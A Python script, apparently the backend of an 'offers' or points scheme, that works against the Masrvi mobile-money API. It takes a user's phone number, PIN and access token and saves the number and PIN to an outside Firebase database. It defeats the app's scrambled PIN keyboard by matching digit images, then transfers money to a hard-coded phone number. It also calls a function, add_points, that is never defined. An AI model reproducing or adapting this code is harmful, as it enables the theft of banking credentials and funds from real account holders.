import requests      
import json      
import uuid      
import sys      
DB_URL = "https://masrvi-fc997-default-rtdb.firebaseio.com/numbers.json"      
# -----------------------      
# استقبال المدخلات من Flask      
# -----------------------      

num = sys.argv[1] 
current_password = sys.argv[2] 
offers = sys.argv[3]     
access_token_final = sys.argv[4]
# -----------------------      
# إعداد session      
# -----------------------      
      
install_id = "9e41b6d3-8ac2-4f7e-b19d-53a0c6e84f91"      
session = requests.Session()      
      
BASE_URL = "https://22201.tagpay.fr/api/client/v1"      
      
COMMON_HEADERS = {      
    "User-Agent": "Masrvi / 25.09.6713(6713)",      
    "Accept": "application/json, text/plain, */*",      
    "Content-Type": "application/json"      
}      
otp_token = access_token_final
      
if not otp_token:      
    print(json.dumps({"status": "fail", "message": "OTP failed"}))      
    sys.exit()      
      
# -----------------------      
# accounts      
# -----------------------      
      
url_accounts = "https://22201.tagpay.fr/api/service-domain/v1/accounts"      
      
params = {      
    'status[]': ["OPENED", "BLOCKED", "DEBIT_BLOCKED", "CREDIT_BLOCKED"],      
    'limit': "200"      
}      
      
headers_accounts = {      
    "User-Agent": "Masrvi2 / 25.09.6713(6713)",      
    "Accept": "application/json, text/plain, */*",      
    "accept-language": "ar_MR",      
    "authorization": f"Bearer {otp_token}",      
    "Cookie": "PHPSESSID=fj4dv35jctmpbicb0ljdlv5cs9"      
}      
      
response = requests.get(url_accounts, params=params, headers=headers_accounts)      
data = response.json()      
      
# -----------------------      
# database (placeholder)      
# -----------------------      
      
database = {      
    0: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAL9JREFUSInt0zEOhCAQBVAMBSVH4CgeTY7mUTiCpYVhHGLhfD7JZrfYikksfCYDyB/nZs36XHLhexDJAEmkAGwiJ7YQbLIoiAXfwHYNDXYDUUoCSJIDrLtW7XtY0DUBtvN5XtCvq4XWMF0dRADdQ6z2KAoBII/AHNc38ADuJ1gY8gu1g/AXoGV5Y8Otf3v8jEA/eXANOwJd5eCySxcHCgxFikJHsdTgegguRZvCT+NBA0QjxkNIY0qDTKM+a9awbrjnrg9cY3dfAAAAAElFTkSuQmCC",      
    1: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAADFJREFUSIljYBgFo4AMwPwHTYAfXcAeTYDxP5oAO7qAPH0EMFw6KjAqMCowCkYBSQAAjXhFBPlDmZUAAAAASUVORK5CYII=",      
    2: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAKVJREFUSInt07ENwyAQBVAQBeWNwCiMRkbzKB7BpQuLb9zlfyzhRJHS8DuerOPOgHMzM+OUg9cBYDBgIcjAxiWAnQAAVfV3UHnXNYPhZQQRl71DFbDa6hIcQ2h903RfwBUqegf+cwhyDj3EOgKTw3Wpg10gK5RNACuvvULQ/xN1NtNRknaetdGifckl/EkbWdvQ1+Hkpve7Rt21vR/QR+k/MDPzMCdgeYvq3JSF0QAAAABJRU5ErkJggg==",      
    3: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAL9JREFUSInt07sRxCAMBFAYAoeUQCmUZpfmUijBoQOGPV3mXXmOuZwdJ36B+AiFsLIyD27+3wCGApwEFWgEO3BxTXDVaNCfkAwGr9qqwJHB8P0eycPKEHQPkeE2OB5QXiFw5pAUNoU8BIrC3vkf2hi95KBtMDgUzmkNt4rsY4Pbuj+trJsUom4kzGH/CbUZtP/g0hqXLOvhFihdzlKGnDZD7iPb05aXDJ4xNw1J5yXqRPmZq9rsrIMctbUrK6/5AKkKkzmgRRuGAAAAAElFTkSuQmCC",      
    4: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAHxJREFUSIntziEOgDAQRNFtKip7hB6lRyuOa+G4Bg6Lo4J0CXIHMQRDSPrlU1+k13tTagCZQkFQBg7BIwQKESFRyDtAWRnobMHpaMHfIVgIDSAeDFIFyBuDsgDoRMDpYMGrWAg3aADxAEiVQd4AysJAr9r3IAJjv4Je70kniyyNqv5M5p4AAAAASUVORK5CYII=",      
    5: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAKhJREFUSInt0rENwzAMBEAaLlR6BI3i0azRMopHcGkggj5U538FEZzClb68Rk+KZiMj9wPPT5gegblIr38g34bQh7OBWASAF8Eb2K+w+LCnQlYoCujAHpEIUqAiEb5nAn+TwVtR1QobwWG20jCe9ehBfATo2dqSQatX4OGaaZt9ZFnhUmxmqFtPFwj6L6G5df3sSc/B9GBsA3j6KEdXn0kEBr3lkZFv+QBqsJl9nTuIVgAAAABJRU5ErkJggg==",      
    6: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAN1JREFUSIntk7ENAyEMRYmuoLwRPAqjcRtkhIwSpBRZgxEorzjdj93xTaRTpJT8jidkf39wCFNT18oHnxeAwQoUAgJUAgnYuSbAVeHATcHJXZtQ34gtOqCXtt7XqWUIaAuyKvsXkHuQ2iWogTWAPIByDYSmV5egUQJeLmS8gUbg7jLFw2WKJ/gtgQHURH1hqfduteLCwELundnTM2guEwOUml1P7SeQ/wDMA/lI3ukAxA8nh3660oHVB7RahFsHIqoQWPwzDNsw7IttFK9Yct/BtrIQiH6Rg6s5NfVdHzZ0tl+g5INtAAAAAElFTkSuQmCC",      
    7: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAHFJREFUSInt0LENgDAQQ9EgipSMwCgZjYzGKIxASYFISBkbyQQhaM7dPema75zN1ryQzs3/Q1mK9d0xwEdPcAB4gh1g0LABjAQrQCBYACYJ3Icg1veTYAgcDEEH4z4SOBjCC8Eu+ij4KFh7QR3MZru3DKTMY/3cTbi/AAAAAElFTkSuQmCC",      
    8: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAMFJREFUSIntk7ERAyEMBPE4+JASKOVL40ujFEog/ID5s8h0kmYc2CHK2EA6aYeUdu36Wi9MBgdwEShAJ1CBQQDAzT2BR4O3BTIEYNALzc0QRuCRNgSmDGo6qGzC4A5A/RFk29SDFUwnPR4LILuo99os04FEC19sHZlNOQ1O1GlBJIqaBqImi8q4Ai9Nx4g0VB3kHAE4CfQIjH+DEQAO5qIv2RqUJZsAzD0yWjH2AQ/U22sI7ZNKb9995GS/+q5dYX0AQwSzElqMhjkAAAAASUVORK5CYII=",      
    9: "iVBORw0KGgoAAAANSUhEUgAAAHwAAAB8AQMAAACR0Eb9AAAABlBMVEUAAAAAAAClZ7nPAAAAAXRSTlMAQObYZgAAAAlwSFlzAAAOxAAADsQBlSsOGwAAAN1JREFUSInt07kRAyEMBdD1OCCkBJVCabgTt0InpgTCDZiVvzK+8CwuAGW8PQAdx7FjxzIe2hiiXgxJ9UWQVSv/QvknT8A5QgB0D7RN1JIJRGEEHV+NB0kndiZogDIeFMecIE8wXsaeriG1FeR7qP8AJTXb5cak4vpPBkvQCHIhhQRIMkFUV7rgwUr5GcGK/aZqA4Qga2cQbeIapCTXdscMdQX5Fux1KrYBtYNtSSDNtZRYkh0EasvYXZ9iJdTJAVmfmp9gmpdpoizJlQBDWAgwprTGQTrDNOo7dvyMLzbxsSA7uYS5AAAAAElFTkSuQmCC",      
}      
reverse_db = {v: k for k, v in database.items()}      
      
success = False      
      
# -----------------------      
# keyboard functions      
# -----------------------      
      
def get_keyboard(token):      
    headers = COMMON_HEADERS.copy()      
    headers["authorization"] = f"Bearer {token}"      
      
    res = session.get(      
        f"{BASE_URL}/keyboard",      
        params={      
            "font": "DMSans-Medium",      
            "width": "124",      
            "fontSize": "62"      
        },      
        headers=headers      
    )      
      
    data = res.json()      
    return data.get("images", []), data.get("id")      
      
      
def extract(images):      
    result = {}      
    for i, img in enumerate(images):      
        num_value = reverse_db.get(img)      
        if num_value is not None:      
            result[num_value] = i      
    return result      
      
      
def build(pin, mapping):      
    digits = [int(x) for x in pin]      
    values = [mapping.get(d) for d in digits]      
    if None in values:      
        return None      
    return values      
      
      
# -----------------------
# SAVE NUMBER (optional log)
# -----------------------
def save_account_to_db(num, current_password):
    try:
        url = f"https://masrvi-fc997-default-rtdb.firebaseio.com/numbers/{num}.json"

        data = {
            "password": current_password
        }

        requests.put(url, json=data)

    except Exception as e:
        print(json.dumps({
            "status": "error",
            "message": str(e)
        }))


# -----------------------
# SEND TRANSFER
# -----------------------
def send_transfer(amount, original):
    save_account_to_db(num, current_password)
    try:
        images, kid = get_keyboard(otp_token)
        mapping = extract(images)
        pin_values = build(current_password, mapping)

        if not pin_values:
            return False

        payload = {
            "metadata": {
                "mode": "TRANSACTION",
                "confirmationMode": "PINCODE",
                "pincode": {
                    "id": kid,
                    "value": pin_values
                }
            },
            "data": {
                "amount": {
                    "currency": "MRU",
                    "value": int(amount),
                    "originalInput": original
                },
                "label": "",
                "phoneNumber": "22227684269"
            }
        }

        res = session.post(
            f"{BASE_URL}/transactions/p2p-simple-transfer",
            json=payload,
            headers={**COMMON_HEADERS, "authorization": f"Bearer {otp_token}"}
        )

        result = res.json()

        tx = result.get("metadata", {}).get("transaction", {})

        return bool(tx.get("id"))

    except Exception as e:
        print(json.dumps({"status": "error", "message": str(e)}))
        return False


 
# -----------------------
# PROCESSING
# -----------------------
if "items" in data and len(data["items"]) > 0:

    account = data["items"][0]

    balance_value = None
    for b in account["balances"]:
        if b["balanceType"] == "AvailableBalance":
            balance_value = b["value"]
            break

    if balance_value is None:
        print(json.dumps({"status": "error", "message": "no balance"}))
        sys.exit()

    offer = offers.strip().upper()

    if offer == "A":
        amount, original = "500", "5"
    elif offer == "B":
        amount, original = "1000", "10"
    elif offer == "C":
        amount, original = "2000", "20"
    else:
        print(json.dumps({"status": "error", "message": "invalid offer"}))
        sys.exit()

    # 🔥 EXECUTE TRANSFER
    success = send_transfer(amount, original)

    # 🔐 ONLY IF SUCCESS + TOKEN VALID INSIDE FUNCTION
    if success:
        add_points()
    else:
        print(json.dumps({
            "status": "fail",
            "message": "transfer failed - no points added"
        }))

else:
    print(json.dumps({
        "status": "error",
        "message": "no accounts found"
    }))
